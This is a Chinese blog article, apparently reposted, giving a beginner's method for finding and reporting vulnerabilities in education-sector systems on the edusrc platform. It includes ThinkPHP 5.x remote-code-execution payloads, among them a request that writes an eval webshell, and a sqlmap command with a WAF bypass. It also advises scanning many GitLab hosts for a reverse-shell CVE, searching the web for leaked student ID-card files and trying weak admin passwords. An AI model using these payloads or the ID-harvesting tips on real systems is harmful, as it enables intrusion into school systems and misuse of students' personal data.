> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwODc1NTgyMg==&mid=2247486122&idx=1&sn=012c519c0ba7f268ca533fb22f341c82

#  小白快速入门src挖掘  
mashiro  蓝云Sec   2025-06-22 03:00  
  
## edusrc挖掘心得  
## edusrc平台介绍  
  
我们可以在关于页面看到edusrc的收录规则：  
  
现阶段，教育行业漏洞报告平台接收如下类别单位漏洞：  
- 教育部  
  
- 各省、自治区教育厅、直辖市教委、各级教育局  
  
- 学校  
  
- 教育相关软件  
  
可以看到不仅是大学的资产、还有小学初中高中的教育局的也可以交到上面、而资产不仅只有网站，也可以从小程序，app方面入手，不过这方面利用难度就要大一些  
## 一些思路  
### 0x01信息搜集  
> 收集到别人收集不到的资产，就能挖到别人挖不到的洞。  
  
### 网络空间测绘  
  
奇安信的鹰图，fofa等  
  
查询教育资产的语法：
```
domain=&#34;edu.cn&#34;
```

  
 表示搜索以edu.cn为结尾的资产，ip.isp="教育"，表示搜索教育网段的资产，后者的搜索规模是比前者大很多  
### 子域名搜集  
  
phpinfo等在线的搜集  
  
OneForAll gayhub知名的子域名收集工具  
  
目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等  
  
site:***.edu.cn 谷歌语法也可以帮助我们找到一些域名信息  
  
whois反查：  
  
whois反查(知道该注册人拥有哪些域名)  
  
电话反查  
  
域名多的情况下，还可以域名批量反查  
  
最后可以把以上工具搜集到的子域名去重就得到了一份完整的大学网站域名资产，这种做法对渗透一些证书大学很有帮助。  
### 学号、身份证收集  
  
这里就可以利用谷歌语法搜集  
  
filetype:xls site:xxx.edu 身份证  
  
有时候运气好就可以搜集到泄露的身份证信息，+1rank(从来没遇到过)  
  
如果能用这种方法搜集到对应的学号身份证，就可以进系统测试了！或者直接连上vpn进内网上fscan扫描（这里的话可以通过上面说的搜集到的子域名去获得对应的内网ip地址，  
### 指纹识别  
#### 非常有用  
  
谷歌插件wappalyzer：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQKib1YfDviaxdq7yMCREeoiayibJQibW9JN5HM8LtibxjthYibG2rEXO5XjQyw/640?wx_fmt=png&from=appmsg "")  
  
## c段旁站信息  
  
这里我使用这个工具Cscan，虽然有些小bug但是也是非常推荐的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQ8o8icaH5uBVeOEGXEZ4Wkhw1crNVsqmKlibySDs5mtedia3ENMqmD0qZg/640?wx_fmt=png&from=appmsg "")  
  
还有一些在线网站：潮汐指纹  
## js api接口发现  
  
这两个工具都可以去github下载  
  
jsfind  
  
Packer-Fuzzer（webpack 打包的前端都可以扫一下有惊喜  
### 0x02我的一些骚思路  
  
废话不多说了  
  
先说一下我感受的挖洞难度：证书大学站> 资产多的普通大学 > 资产多的职业学院 > 有账号密码能进内网  
  
所以我一开始是去找那种职业学院打的，大概是排行榜50多页的学校，可以用鹰图title="xxxx"进行搜集，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQyNqwBE7JFJJIdsepbCxsdTnfvPefib70Rf9u0vZBuWK4qWpsKKbGSFQ/640?wx_fmt=png&from=appmsg "")  
  
因为一些带专网站的安全意识比较差的，所以有时候能遇到那种弱口令进后台文件上传拿shell的，关于弱口令：用户名一般是admin ，密码一般是123456，admin，888888 三选一，不是的话可以撤退了  
  
弱口令真的yyds  
  
除了弱口令  
  
然后说一下其他思路  
  
比如说think5未开强制路由RCE,这种网站很多大学都存在，但是寻找thinkphp符和条件的网站却很难，一种利用鹰图就是搜索默认图标hash值来寻找，但是这种估计很难捡到，但是在闲逛的过程中看到路由规则类似thinkphp的可以尝试一下(靠这个上了十多rank  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQ46cSJV0Xmxx1SItc7uOXULfsYlN099x3e6xmbZN1nQlJqlGtko6iaoQ/640?wx_fmt=png&from=appmsg "")  
  
一些payload:  
  
**5.1.x**  
  
：  

```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

  
**5.0.x**  
  
：  

```
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

  
写入 shell  

```
public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../shell.php&vars[1][]=<?php @eval($_REQUEST[cmd]);?>
```

  
**然后然后，讲一下我一些思路，使用一些Nday来快速上分，或者挖掘逻辑漏洞实现通杀**  
  
**关于Nday这里举俩个例子大家自行体会**  
  
**比如说你知道有一个cve 比方说这个gitlab的cve：gitlab-CVE-2021-22205，gitlab显而易见的是很多高校都有这个gitlab的托管网站**  
  
**所以说我们只要把所有gitlab edu上的资产全部搜集过来然后利用脚本一一检测就了**  
  
**这里说一下怎么搜集的**  
  
**先从图标下手，限定edu域名：可以看到有17条资产  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQRoNECCic1bVuJEkfhrwcRdX0CH9lv0kQFv1DibM7aXx9S4GuAhCAAuZg/640?wx_fmt=png&from=appmsg "")  
  
限定ip有27条资产  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQ6IYydJ6DZ6n5OfPeER4R3eMkQEeLLA3oFtHAyTTI7FVJn0iarM7ibAFA/640?wx_fmt=png&from=appmsg "")  
  
去除图标的有45条资产  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQ4Ctq7luniaNmax9LpnWJIlQO3Ij18tr2icAUO1JrJE7Ah2hzZGVzniaAg/640?wx_fmt=png&from=appmsg "")  
  
把数据全部导出收集到一起，利用github上的脚本进行检测，这样就捡到俩个洞，因为gitlab这个cve是可以反弹shell的，所以12rank到手  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQYZLpSCnUibuhTUTvEdH3KM5ndWVwEC1CN3ibZl0QEKVSV2PGzBicDiaS8Q/640?wx_fmt=png&from=appmsg "")  
  
再说一个比如说springboot未授权访问漏洞：  
  
同上一样的方法：直接搜java白页，把数据导出->脚本检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQwj9YAElVhiboFXorfSfoZicnoicM8eia7BwSraq55MoiayVPBnKqEtib7GJg/640?wx_fmt=png&from=appmsg "")  
  
因为范围足够大所以也能有不小收获  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQV7Lt05AMXAKwpZXNej4ONfsPgXtia9icY7dBdQ4BYur567xPXicyegFaw/640?wx_fmt=png&from=appmsg "")  
  
剩下的可以自己探索，或者有更好的思路可以交流  
## 逻辑漏洞  
  
这里可以使用jsfind脚本去寻找一些js接口，可能会有未授权文件上传，ssrf等等，或者在登录抓取返回包把false改成true等操作，去实现登录绕过，总之来说就是要细心的阅读源码，找接口。  
## sql注入  
  
寻找注入点方法：site:edu.cn inurl:xxx.php|jsp|asp?xxx= xxx可以自己发挥想象 ，或者在一些老系统登录，支付平台上都有可能存在注入  
  
但是sql注入大多学校都上了waf，绕过waf不容易，主要的方法有内联，分段，以及垃圾字符填充等等  
  
这里举一个绕安全狗的例子：  
  
这里原本的参数是a和b，但是a，b参数的输入会被waf检测，通过拦截可以看出是常见的安全狗waf，所以这里可以多添加俩个参数：aa，bb（后端不会接收这两个参数，但是安全狗不会检测注释里的内容，这样就简单绕过了），指定好注入点使用sqlmap轻松拿下。  
  

```
sqlmap -u &#34;xxx.aspx?aa=/*&a=1&b=2&bb=*/&#34; -p &#34;b&#34; --random-agent
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQHm8L4ZhrW8w8dHbKS9Ad4wXIWMIKRf38vB8WWmp4g00RIFXDvibMNgQ/640?wx_fmt=png&from=appmsg "")  
  
  
